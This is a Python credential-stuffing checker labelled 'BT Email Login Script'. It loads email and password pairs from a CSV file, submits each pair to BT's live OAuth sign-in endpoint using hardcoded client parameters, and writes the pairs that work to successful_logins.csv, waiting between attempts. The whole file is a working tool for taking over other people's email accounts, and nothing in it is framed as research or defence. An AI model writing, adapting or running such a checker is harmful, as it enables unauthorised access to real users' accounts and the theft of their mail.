import os
import requests
from bs4 import BeautifulSoup
import csv
import time
import logging
import argparse
from tqdm import tqdm

def setup_logging(log_file):
    logging.basicConfig(filename=log_file, level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

def read_logins(file_path):
    logins = []
    if os.path.exists(file_path):
        with open(file_path, "r") as f:
            for line in f:
                parts = line.strip().split(',')
                if len(parts) == 2:
                    email, password = parts
                    logins.append({"email": email, "password": password})
                else:
                    logging.warning(f"Skipping malformed line in {file_path}: {line.strip()}")
    return logins

def save_successful_login(username, password, file_path):
    with open(file_path, "a", newline='') as f:
        writer = csv.writer(f)
        writer.writerow([username, password])

def login(username, password, login_url):
    session = requests.Session()
    try:
        response = session.get(login_url)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, "html.parser")
        
        login_data = {
            "client_id": "bf4e9e5e-0d73-46b3-ad02-06f335bd5105",
            "scope": "bf4e9e5e-0d73-46b3-ad02-06f335bd5105 openid profile offline_access",
            "redirect_uri": "https://email.bt.com/mail/saf/sso.jsp",
            "response_type": "code",
            "state": "yi4VMTDOd8RdF2JYNpk",
            "username": username,
            "password": password
        }

        response = session.post(login_url, data=login_data)
        response.raise_for_status()
        
        if "authorize" not in response.url:
            return session
    except requests.RequestException as e:
        logging.error(f"Request error during login {username}: {e}")
    return None

def check_logins(logins, login_url, success_file):
    total = len(logins)
    success = 0
    with tqdm(total=total, desc="Checking logins", unit="login") as pbar:
        for login_info in logins:
            try:
                session = login(login_info["email"], login_info["password"], login_url)
                if session:
                    save_successful_login(login_info["email"], login_info["password"], success_file)
                    logging.info(f"Successful login: {login_info['email']}")
                    success += 1
                time.sleep(2)
            except Exception as e:
                logging.error(f"Error logging in {login_info['email']}: {e}")
            pbar.update(1)
    print(f"\nTotal checked: {total}, Successful: {success}\n")

def main_menu():
    log_file = "login_script.log"
    success_file = "successful_logins.csv"
    login_url = "https://prod-btemailauth.bt.com/81522fe7-47cf-4713-bdb7-b6f7bfe421a6/b2c_1a_rpbt_signin/oauth2/v2.0/authorize"
    
    setup_logging(log_file)
    
    while True:
        print("\n--- BT Email Login Script ---")
        print("1. Load and check logins")
        print("2. View successful logins")
        print("3. Change login file")
        print("4. Exit")
        choice = input("Enter your choice: ")
        
        if choice == "1":
            login_file = input("Enter the login file path (default: logins.csv): ") or "logins.csv"
            logins = read_logins(login_file)
            if logins:
                check_logins(logins, login_url, success_file)
            else:
                print(f"No valid logins found in {login_file}")
        elif choice == "2":
            if os.path.exists(success_file):
                with open(success_file, "r") as f:
                    print(f.read())
            else:
                print("No successful logins recorded.")
        elif choice == "3":
            login_file = input("Enter new login file path: ")
            if os.path.exists(login_file):
                print(f"Login file changed to {login_file}")
            else:
                print("File not found. Please check the path.")
        elif choice == "4":
            print("Exiting.")
            break
        else:
            print("Invalid choice. Try again.")

if __name__ == "__main__":
    main_menu()
